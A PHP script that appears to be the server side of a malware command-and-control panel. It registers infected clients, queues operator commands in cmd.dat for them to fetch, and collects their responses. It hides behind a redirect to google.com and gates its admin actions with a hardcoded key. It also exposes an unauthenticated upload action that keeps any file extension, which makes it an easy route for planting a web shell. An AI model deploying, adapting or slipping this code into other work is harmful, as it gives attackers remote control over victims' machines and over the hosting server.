<?php
if(!isset($_GET['cmd'])) {
	header('Location: http://google.com/');
}

$key1		=	'12345';
$command 	= 	$_GET['cmd'];
$Directory	=	'users/';
$Directory2	=	'Uploads/';
$PostData	=	'';
$PostID		=	'';

if(isset($_POST['Data'])) {
	$PostData	=	$_POST['Data'];
}
if(isset($_POST['ID'])) {
	$PostID		=	$_POST['ID'];
}

switch ($command) {
	case 'admin':
		checkKey();
		if (!file_exists($Directory) and !is_dir($Directory)) {
			mkdir($Directory, 0777, true);
		}
		if (!file_exists($Directory2) and !is_dir($Directory2)) {
			mkdir($Directory2, 0777, true);
		}
		if (glob($Directory.'*.zero*') != false) {
			$files = glob($Directory.'*.zero', GLOB_BRACE);
			foreach($files as $file) {
				readfile($file);
				echo "\r\n";
			}
		}
		break;
	case 'upload': 
		$temp = explode(".", $_FILES["file"]["name"]);
		$extension = end($temp);
		if ($_FILES["file"]["error"] > 0){
			echo "Error";
		} else{
			$newfile = uniqid("image_").".".$extension;
			move_uploaded_file($_FILES["file"]["tmp_name"], $Directory2."/".$newfile);
			echo $newfile;
		}
		break;
	case 'connect':
		checkKey();
		$filename = $PostID.'.zero';
		$fp = fopen($Directory.$filename, "w");
		fwrite($fp, $PostData);
		fclose($fp);
		echo 'Success';
		break;
	case 'disconnect':
		checkKey();
		$filename = $PostID.'.zero';
		if(file_exists($Directory.$filename)){
			unlink($Directory.$filename);
		}
		echo 'Success';
		break;
	case 'clearresponse':
		if(file_exists('response.dat')){
			Unlink('response.dat');
		}
		break;
	case 'clearcmd':
		if(file_exists('cmd.dat')){
			Unlink('cmd.dat');
		}
		break;
	case 'readcmd':
		if (!file_exists('cmd.dat')) {
			$file = fopen('cmd.dat','w');
			fwrite($file, '');
		} else {
			readfile('cmd.dat');
		}
		break;
	case 'readdata':
		if (!file_exists('data.dat')) {
			$resp = fopen('data.dat', 'w');
			fwrite($resp, '');
		} else {
			$resp = fopen('data.dat', 'r');
			$buffer = '';
			while(!feof($resp)) {
				$buffer .= fread($resp, 128);
			}
			echo $buffer;
		}
		break;
	case 'saveresponse':
		writeFile('response.dat', $PostData);
		break;
	case 'writecmd':
		writeFile('cmd.dat', $PostData);
		break;
	case 'writedata':
		writeFile('data.dat', $PostData);
		break;
}

function checkKey() {
	global $key1;
	if(isset($_GET['key'])){
		if(($_GET['key']) != $key1) {
			echo 'Connection error';
			exit;
		}
	} else {
		echo 'Connection error';
		exit;
	}
}

function writeFile($filename, $data) {
	$open = fopen($filename, 'w');
	fwrite($open, $data);
	fclose($open);
	echo 'Ok';
}
// STFU. Strik3r!
?> 